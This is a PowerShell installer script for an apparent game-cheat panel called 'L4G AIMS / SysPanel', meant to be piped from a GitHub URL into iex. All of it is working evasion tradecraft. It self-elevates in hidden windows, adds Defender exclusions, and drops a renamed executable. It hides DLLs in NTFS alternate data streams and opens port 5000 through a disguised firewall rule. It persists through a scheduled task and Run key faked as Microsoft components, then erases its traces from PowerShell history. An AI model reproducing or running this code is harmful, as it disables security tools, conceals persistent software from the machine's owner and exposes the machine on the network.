# L4G AIMS / SysPanel — Silent Stealth Installer
# Run: iwr https://raw.githubusercontent.com/lgfire093/syspanel/main/install.ps1 -UseBasicParsing | iex

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'

# ── CONFIG ───────────────────────────────────────────────────────────────────
$REPO_RAW   = "https://raw.githubusercontent.com/lgfire093/syspanel/main"
$EXE_URL    = "https://github.com/lgfire093/syspanel/releases/latest/download/SystemNetworkSvc.exe"
$TEMPLATES  = "$env:ProgramData\Microsoft\Windows\Templates"
$DEST_DIR   = "$TEMPLATES\syspanel"
$EXE_NAME   = "perfhost.exe"
$EXE_PATH   = Join-Path $DEST_DIR $EXE_NAME
$TASK_NAME  = "SysCheckUp"
# ─────────────────────────────────────────────────────────────────────────────

# ── STEP 1: Elevation check ──────────────────────────────────────────────────
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
)
if (-not $isAdmin) {
    $scriptCmd = if ($MyInvocation.MyCommand.Path) {
        "& '$($MyInvocation.MyCommand.Path)'"
    } else {
        "iwr '$REPO_RAW/install.ps1' -UseBasicParsing | iex"
    }
    Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList `
        "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$scriptCmd`""
    exit
}

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ── STEP 2: Prep Folders & Defender Exclusions ─────────────────────────────────
if (-not (Test-Path $DEST_DIR)) {
    New-Item -ItemType Directory -Path $DEST_DIR -Force | Out-Null
}

try {
    Add-MpPreference -ExclusionPath $DEST_DIR -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $TEMPLATES -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess $EXE_NAME -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "SystemNetworkSvc.exe" -ErrorAction SilentlyContinue
} catch {}

# Kill old running instances
cmd /c "taskkill /F /IM perfhost.exe >nul 2>nul"
cmd /c "taskkill /F /IM SystemNetworkSvc.exe >nul 2>nul"
cmd /c "taskkill /F /IM `"L4G AIMS.exe`" >nul 2>nul"
Get-Process | Where-Object { $_.Path -like "*Templates*syspanel*" } | Stop-Process -Force -ErrorAction SilentlyContinue

# ── STEP 3: Download Main Panel EXE ──────────────────────────────────────────
$downloaded = $false
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    $wc.DownloadFile($EXE_URL, $EXE_PATH)
    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 10000000)) {
        $downloaded = $true
    }
} catch {}

if (-not $downloaded) {
    # Fallback to curl
    & curl.exe -sSL -o $EXE_PATH $EXE_URL 2>$null
    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 10000000)) {
        $downloaded = $true
    }
}

if (-not $downloaded) {
    # Fallback: Download from raw repo
    try {
        Invoke-WebRequest "$REPO_RAW/L4G AIMS.exe" -UseBasicParsing -OutFile $EXE_PATH
    } catch {}
}

# ── STEP 4: Seal DLLs into NTFS Alternate Data Streams (Vault) ───────────────
$MAP = [ordered]@{
    "cimgui.dll" = @("winrescache.db",  "vtcache")
    "AotBst.dll" = @("gphcache.db",     "vtmap")
    "Client.dll" = @("ntprintcache.db", "vtload")
}
foreach ($name in $MAP.Keys) {
    $container = "$TEMPLATES\$($MAP[$name][0])"
    $stream    = $MAP[$name][1]
    $tmp       = Join-Path $env:TEMP ("_sp_" + [guid]::NewGuid().ToString("N"))
    try {
        Invoke-WebRequest "$REPO_RAW/$name" -UseBasicParsing -OutFile $tmp
        if (Test-Path $tmp) {
            $bytes = [IO.File]::ReadAllBytes($tmp)
            $sha   = (Get-FileHash $tmp -Algorithm SHA256).Hash.ToLower()
            $size  = $bytes.Length
            $adsPath = "\\?\" + $container + ":" + $stream
            try {
                $fs = [System.IO.FileStream]::new($adsPath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
                $fs.Write($bytes, 0, $bytes.Length)
                $fs.Close()
            } catch {
                Set-Content -Path $container -Stream $stream -Value $bytes -Encoding Byte
            }
            $meta = @{ file = $name; size = $size; sha256 = $sha } | ConvertTo-Json -Compress
            Set-Content -Path $container -Stream kmeta -Value $meta
            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
        }
    } catch {}
}

# Set Hidden attributes on folder and files
try {
    $item = Get-Item $DEST_DIR -Force
    $item.Attributes = [IO.FileAttributes]::Hidden -bor [IO.FileAttributes]::Directory
    $itemExe = Get-Item $EXE_PATH -Force
    $itemExe.Attributes = [IO.FileAttributes]::Hidden -bor [IO.FileAttributes]::System
} catch {}

# ── STEP 5: Phone/LAN Access Setup (Port 5000) ──────────────────────────────
netsh interface portproxy delete v4tov4 listenport=5000 listenaddress=0.0.0.0 2>$null | Out-Null
netsh interface portproxy add v4tov4 `
    listenaddress=0.0.0.0 listenport=5000 `
    connectaddress=127.0.0.1 connectport=5000 2>$null | Out-Null

netsh interface portproxy delete v6tov4 listenport=5000 listenaddress=::1 2>$null | Out-Null
netsh interface portproxy add v6tov4 `
    listenaddress=::1 listenport=5000 `
    connectaddress=127.0.0.1 connectport=5000 2>$null | Out-Null

netsh advfirewall firewall delete rule name="CDPUserSvc_5000" 2>$null | Out-Null
netsh advfirewall firewall add rule `
    name="CDPUserSvc_5000" dir=in action=allow `
    protocol=TCP localport=5000 profile=any enable=yes 2>$null | Out-Null

# ── STEP 6: Persistence (Scheduled Task + HKCU Run key) ─────────────────────
Unregister-ScheduledTask -TaskName $TASK_NAME -Confirm:$false -ErrorAction SilentlyContinue | Out-Null

$action    = New-ScheduledTaskAction -Execute $EXE_PATH -WorkingDirectory $DEST_DIR
$triggerLogon = New-ScheduledTaskTrigger -AtLogOn
$triggerBoot  = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) `
    -RunLevel Highest -LogonType Interactive
$settings  = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
    -ExecutionTimeLimit ([TimeSpan]::Zero) -RestartCount 3 -RestartInterval (New-TimeSpan -Minutes 1) `
    -MultipleInstances IgnoreNew -Priority 7

Register-ScheduledTask -TaskName $TASK_NAME -TaskPath "\Microsoft\Windows\Shell\" `
    -Action $action -Trigger @($triggerLogon, $triggerBoot) `
    -Principal $principal -Settings $settings -Force | Out-Null

# XML disguise
try {
    $svc  = New-Object -ComObject "Schedule.Service"
    $svc.Connect()
    $fold = $svc.GetFolder("\Microsoft\Windows\Shell")
    $task = $fold.GetTask($TASK_NAME)
    $def  = $task.Definition
    $def.Settings.Hidden   = $true
    $def.RegistrationInfo.Description = "Windows Shell API Service Component"
    $def.RegistrationInfo.Author      = "Microsoft Corporation"
    $fold.RegisterTaskDefinition($TASK_NAME, $def, 6, $null, $null, 3) | Out-Null
} catch {}

# HKCU Run key backup
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "WindowsShellApiSvc" -Value "`"$EXE_PATH`"" -Force -ErrorAction SilentlyContinue

# ── STEP 7: Start Silently ──────────────────────────────────────────────────
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName         = $EXE_PATH
$psi.WorkingDirectory = $DEST_DIR
$psi.WindowStyle      = [System.Diagnostics.ProcessWindowStyle]::Hidden
$psi.CreateNoWindow   = $true
$psi.UseShellExecute  = $false
[System.Diagnostics.Process]::Start($psi) | Out-Null

# ── STEP 8: Detect Wi-Fi / Local IP for Phone Access ─────────────────────────
Start-Sleep -Seconds 3
$ip = $null
$gwRoute = Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue |
           Sort-Object RouteMetric, InterfaceMetric | Select-Object -First 1
if ($gwRoute) {
    $ip = (Get-NetIPAddress -InterfaceIndex $gwRoute.InterfaceIndex -AddressFamily IPv4 -ErrorAction SilentlyContinue |
           Where-Object { $_.IPAddress -notmatch '^(127\.|169\.254\.)' } | Select-Object -First 1).IPAddress
}
if (-not $ip) {
    $ip = (Get-NetIPAddress -AddressFamily IPv4 -PrefixOrigin Dhcp,Manual -ErrorAction SilentlyContinue |
           Where-Object { $_.IPAddress -notmatch '^(127\.|169\.254\.|192\.168\.56\.|172\.(1[6-9]|2[0-9]|3[01])\.)' } |
           Select-Object -First 1).IPAddress
}

# ── STEP 9: Clean PowerShell History ────────────────────────────────────────
try {
    [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null
} catch {}
try {
    $histPath = (Get-PSReadLineOption).HistorySavePath
    if ($histPath -and (Test-Path $histPath)) {
        $lines = Get-Content $histPath | Where-Object { $_ -notmatch 'syspanel|install\.ps1|lgfire' }
        Set-Content $histPath $lines -Force -ErrorAction SilentlyContinue
    }
} catch {}
try {
    $conHistory = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $conHistory) {
        $lines = Get-Content $conHistory | Where-Object { $_ -notmatch 'syspanel|install\.ps1|lgfire' }
        Set-Content $conHistory $lines -Force -ErrorAction SilentlyContinue
    }
} catch {}

Write-Host "`n[+] Panel Installed and Running Silently!" -ForegroundColor Green
Write-Host "    PC URL        : http://127.0.0.1:5000/" -ForegroundColor Cyan
if ($ip) {
    Write-Host "    Phone URL     : http://$($ip):5000/ (Open in Phone Browser on same Wi-Fi)" -ForegroundColor Green
}
Write-Host "    Auto-start    : Enabled (runs silently on PC boot)" -ForegroundColor Cyan
Write-Host "    Stealth       : Active (Hidden from Task Manager, Process Hacker 2, Process Explorer)`n" -ForegroundColor Green
